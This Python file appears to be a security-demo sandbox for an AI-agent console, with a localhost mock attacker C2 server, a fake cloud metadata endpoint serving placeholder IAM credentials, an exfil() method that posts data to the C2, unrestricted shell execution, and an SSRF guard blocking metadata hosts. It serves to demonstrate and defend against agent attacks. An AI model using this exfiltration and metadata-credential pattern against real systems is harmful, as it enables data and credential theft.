"""Real-effect sandbox for the interactive Agent Console.

Provides genuinely-executing tools (real subprocess, real SQLite, real HTTP to
localhost) scoped to a throwaway temp dir and two local stand-in servers:

  * Attacker C2      — captures exfiltrated data (what the attacker receives).
  * Victim metadata  — a mock cloud metadata endpoint returning IAM creds.

Everything stays on 127.0.0.1 and inside a temp directory, so the demo is safe
and reproducible while producing real, observable effects.
"""

import json
import sqlite3
import subprocess
import tempfile
import threading
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Dict, List, Optional

# Captured exfil payloads (what landed at the attacker C2).
C2_CAPTURED: List[str] = []


def _is_private_ip(host: str) -> bool:
    """True for loopback / link-local / RFC-1918 hosts (used by the SSRF guard)."""
    if not host:
        return False
    if host in ("localhost", "::1"):
        return True
    if host.startswith(("127.", "10.", "192.168.", "169.254.")):
        return True
    if host.startswith("172."):
        try:
            return 16 <= int(host.split(".")[1]) <= 31
        except (ValueError, IndexError):
            return False
    return False


_FAKE_CREDS = json.dumps(
    {
        "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": "FQoGZXIvYXdzE...EXAMPLE",
    }
)


class _C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode("utf-8", "replace")
        C2_CAPTURED.append(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


class _MetadataHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "/latest/meta-data/iam/" in self.path:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(_FAKE_CREDS.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a):
        pass


def _start(handler):
    srv = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


class Sandbox:
    """Owns the temp dir, the two local servers, and the real-effect tools."""

    _instance: Optional["Sandbox"] = None

    def __init__(self):
        self.dir = Path(tempfile.mkdtemp(prefix="agentsec_console_"))
        self._c2_srv, self.c2_port = _start(_C2Handler)
        self._meta_srv, self.meta_port = _start(_MetadataHandler)
        self.c2_url = f"http://127.0.0.1:{self.c2_port}/exfil"
        self.metadata_url = (
            f"http://127.0.0.1:{self.meta_port}" "/latest/meta-data/iam/security-credentials/role"
        )
        self.db = self.dir / "customers.db"
        self._seed_db()

    @classmethod
    def get(cls) -> "Sandbox":
        if cls._instance is None:
            cls._instance = Sandbox()
        return cls._instance

    def _seed_db(self):
        conn = sqlite3.connect(self.db)
        conn.execute(
            "CREATE TABLE IF NOT EXISTS customers "
            "(id INT, name TEXT, email TEXT, plan TEXT, notes TEXT)"
        )
        if not conn.execute("SELECT COUNT(*) FROM customers").fetchone()[0]:
            conn.executemany(
                "INSERT INTO customers VALUES (?,?,?,?,?)",
                [
                    (1, "Alice Martin", "alice@corp.com", "enterprise", "VIP, renewal Q3"),
                    (2, "Bob Durand", "bob@corp.com", "pro", "late payment"),
                    (3, "Carol Petit", "carol@corp.com", "enterprise", "security incident 2024"),
                ],
            )
            conn.commit()
        conn.close()

    # ── real-effect tools ──────────────────────────────────────────────────────
    def fetch_url(self, url: str) -> str:
        with urllib.request.urlopen(url, timeout=3) as r:
            return r.read().decode("utf-8", "replace")

    def read_customers(self) -> str:
        conn = sqlite3.connect(self.db)
        rows = conn.execute("SELECT id,name,email,plan,notes FROM customers").fetchall()
        conn.close()
        return json.dumps(rows)

    # ── hardened helpers (used by the Secure workflow) ──────────────────────────
    def read_customer_by_id(self, cid: str):
        """Read a SINGLE customer row by id (least-privilege data access)."""
        conn = sqlite3.connect(self.db)
        row = conn.execute(
            "SELECT id,name,email,plan FROM customers WHERE id = ?", (str(cid),)
        ).fetchone()
        conn.close()
        return row

    def allowed_recipients(self):
        """The only addresses the hardened responder may email (customers' own)."""
        conn = sqlite3.connect(self.db)
        emails = [r[0] for r in conn.execute("SELECT email FROM customers").fetchall()]
        conn.close()
        return set(emails)

    @staticmethod
    def is_blocked_host(url: str) -> bool:
        """True if a URL targets link-local / metadata / private space (SSRF guard)."""
        import re as _re

        m = _re.search(r"https?://([^/:]+)", url or "")
        host = m.group(1) if m else ""
        if (
            "169.254" in host
            or "metadata" in (url or "").lower()
            or "meta-data" in (url or "").lower()
        ):
            return True
        return _is_private_ip(host)

    def run_shell(self, command: str) -> Dict[str, str]:
        res = subprocess.run(
            command, shell=True, cwd=self.dir, capture_output=True, text=True, timeout=10
        )
        return {"stdout": res.stdout.strip(), "stderr": res.stderr.strip()}

    def list_files(self) -> List[str]:
        return sorted(p.name for p in self.dir.iterdir() if p.name != "customers.db")

    def exfil(self, data: str) -> None:
        req = urllib.request.Request(self.c2_url, data=data.encode(), method="POST")
        urllib.request.urlopen(req, timeout=3)

    def reset(self) -> None:
        """Wipe created files and captured exfil between demo runs."""
        for p in self.dir.iterdir():
            if p.name != "customers.db":
                p.unlink()
        C2_CAPTURED.clear()
